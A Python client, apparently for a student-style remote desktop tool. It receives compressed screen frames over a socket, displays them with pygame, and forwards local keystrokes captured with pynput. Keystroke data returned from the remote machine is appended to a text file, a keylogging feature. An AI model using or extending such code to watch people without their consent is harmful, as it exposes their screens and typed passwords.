import socket
from zlib import decompress
from pynput import keyboard
import pygame
import threading
import win32api

WIDTH = 1900
HEIGHT = 1000
listening = True
conn = None  # Global connection variable


def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf


def main(host='127.0.0.1', port=5001):
    global conn
    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    clock = pygame.time.Clock()
    watching = True

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    conn = sock
    try:
        while watching:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    watching = False
                    break

            # Receive the size of the pixels length, the pixels length, and pixels
            perfix = sock.recv(1)
            size_len = int.from_bytes(sock.recv(1), byteorder='big')
            size = int.from_bytes(sock.recv(size_len), byteorder='big')
            if perfix == b"S":
                pixels = decompress(recvall(sock, size))

                # Create the Surface from raw pixels
                img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')

                # Display the picture
                screen.blit(img, (0, 0))
                pygame.display.flip()
                clock.tick(60)
            elif perfix == b"K":
                data = recvall(sock, size)
                open_key_file(data)

    finally:
        sock.close()


def protocol_encode(message, perfix):
    global conn
    print(message)
    size = len(message)
    size_len = (size.bit_length() + 7) // 8
    conn.send(perfix + bytes([size_len]))
    size_bytes = size.to_bytes(size_len, 'big')
    conn.send(size_bytes)
    conn.sendall(message.encode())


def start_keyboard_listener():
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as keyboard_listener:
        keyboard_listener.join()


def on_key_release(key):
    try:
        if key.char == 's' and key.control:
            print("Stop listening command received.")
            return False
        elif key.char == 'k' and key.control:
            print("Restart listening command received.")
    except AttributeError:
        pass


def on_key_press(key):
    try:
        key_char = key.char
    except AttributeError:
        # Handle special keys
        key_char = str(key)
        if key == key.space:
            key_char = " "
    protocol_encode(key_char, b"K")


def open_key_file(data):
    try:
        with open('output_file.txt', 'a') as output_file:
            decoded_data = [chr(item) if isinstance(item, int) else str(item) for item in data]
            output_file.write(''.join(decoded_data) + '')
    except Exception as e:
        print(f"Error:s {e}")


# chr(item) if isinstance(item, int) else str(item): This is the conditional expression.
# It checks if item is an integer (isinstance(item, int)). If it is, it converts the integer to its corresponding Unicode character using the chr function.
# If item is not an integer, it converts it to a string using str(item).


if __name__ == '__main__':
    thread1 = threading.Thread(target=main, args=())
    thread2 = threading.Thread(target=start_keyboard_listener, args=())

    thread1.start()
    thread2.start()

    thread1.join()
    thread2.join()
